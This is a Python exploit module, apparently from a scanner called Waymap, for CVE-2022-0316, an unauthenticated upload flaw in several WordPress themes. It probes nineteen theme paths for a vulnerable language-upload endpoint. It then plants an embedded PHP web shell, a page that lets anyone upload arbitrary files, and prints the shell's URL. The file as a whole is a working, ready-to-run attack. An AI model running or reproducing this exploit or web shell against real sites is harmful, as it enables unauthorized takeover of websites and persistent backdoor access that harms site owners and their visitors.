# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2022-0316 - WordPress Multiple Themes - Unauthenticated File Upload (Shell Upload)

import requests
from colorama import init, Fore, Style
from random import getrandbits

init(autoreset=True)

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

vulnerable_paths = [
    "westand", "footysquare", "aidreform", "statfort", "club-theme",
    "kingclub-theme", "spikes", "spikes-black", "soundblast",
    "bolster", "rocky-theme", "bolster-theme", "theme-deejay",
    "snapture", "onelife", "churchlife", "soccer-theme",
    "faith-theme", "statfort-new"
]

shell_code = '''<?php error_reporting(0);echo("kill_the_net<form method='POST' enctype='multipart/form-data'><input type='file'name='f' /><input type='submit' value='up' /></form>");@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");?>'''

def upload_shell(session, profile_url_url, shell_name):
    try:
        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Attempting to upload shell to {profile_url_url}...")

        files = {"mofile[]": (shell_name, shell_code)}
        response = session.post(profile_url_url, files=files, verify=False, timeout=30)

        if "New Language Uploaded Successfully" in response.text:
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] Shell uploaded successfully!")
            shell_url = profile_url_url.replace("include/lang_upload.php", f"languages/{shell_name}")
            print(f"{Style.BRIGHT}{Fore.CYAN}[•] Shell URL: {shell_url}")
            return shell_url
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] Shell upload failed.")
            return None
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error uploading shell: {e}")
        return None

def check_vulnerability(session, profile_url):
    try:
        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking {profile_url} for vulnerability...")

        for path in vulnerable_paths:
            test_url = f"{profile_url}/wp-content/themes/{path}/include/lang_upload.php"
            response = session.get(test_url, verify=False, timeout=30)

            if 'Please select Mo file' in response.text:
                print(f"{Style.BRIGHT}{Fore.GREEN}[•] Vulnerable endpoint found: {test_url}")
                return test_url
            else:
                print(f"{Style.BRIGHT}{Fore.CYAN}[•] Not vulnerable: {test_url}")

        return None
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error checking vulnerability: {e}")
        return None

def scan_cve_2022_0316(profile_url):
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"})

    profile_url = profile_url.rstrip('/') 
    vulnerable_url = check_vulnerability(session, profile_url)

    if vulnerable_url:
        shell_name = f"{getrandbits(32)}.php"
        shell_url = upload_shell(session, vulnerable_url, shell_name)

        if shell_url:
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] Exploit successful! Shell available at: {shell_url}")
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] Exploit failed. Could not upload shell.")
    else:
        print(f"{Style.BRIGHT}{Fore.RED}[•] No vulnerable endpoints found for {profile_url}.")
